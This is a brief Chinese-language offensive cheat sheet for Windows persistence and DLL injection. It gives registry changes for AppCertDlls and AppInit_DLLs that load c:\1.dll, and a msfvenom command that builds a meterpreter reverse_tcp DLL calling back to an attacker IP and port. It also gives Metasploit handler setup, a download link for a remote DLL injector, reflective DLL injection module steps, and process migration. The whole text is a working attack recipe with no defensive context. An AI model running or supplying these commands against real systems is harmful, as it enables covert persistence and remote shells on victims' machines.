  #### AppCertDlls
	注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\下新建AppCertDlls，新建名字为Default，值为c:\1.dll的项
	#msfvenom –p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 –f dll >/root/1.dll
	Msf>use exploit/multi/handler
	Msf>set payload windows/meterpreter/reverse_tcp
	https://cdn.securityxploded.com/download/RemoteDLLInjector.zip
	> RemoteDLLInjector64.exe PID c:\1.dll
  #### AppInit_DLLs
	注册表HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls下AppInit_DLLs设置为c:\1.dll，LoadAppInit_DLLs设置为1
  #### MSF
	Msf>use post/windows/manage/reflective_dll_inject
	Msf>set session 1
	Msf>set pid 1234
	Msf>set path c:\\1.dll
	Msf>run
	&
	migrate +pid
	&
	Meterpreter>run post/windows/manage/migrate